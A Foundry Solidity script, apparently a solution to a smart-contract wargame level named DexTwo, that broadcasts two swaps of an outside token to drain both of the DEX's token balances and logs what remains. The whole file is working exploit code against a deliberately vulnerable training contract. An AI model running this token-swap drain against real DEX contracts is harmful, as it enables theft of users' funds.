// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";

interface IDexTwo {
    function swap(address from, address to, uint256 amount) external;

    function balanceOf(
        address token,
        address owner
    ) external view returns (uint256);

    function token1() external view returns (address);

    function token2() external view returns (address);
}

contract PoC is Script {
    IDexTwo level23 = IDexTwo(0xcEba857710790f945EC26A5B96Ef6D495F4BF3A5);

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployer);
        address ZTN = address(0xAFE3F881306476e9F6B88cFB224E66d5484c22C1);
        address token1 = level23.token1();
        address token2 = level23.token2();

        level23.swap(ZTN, token1, 100);
        level23.swap(ZTN, token2, 200);

        console2.log(
            "Remaining token1 balance : ",
            level23.balanceOf(token1, address(level23))
        );
        console2.log(
            "Remaining token2 balance : ",
            level23.balanceOf(token2, address(level23))
        );
        vm.stopBroadcast();
    }
}
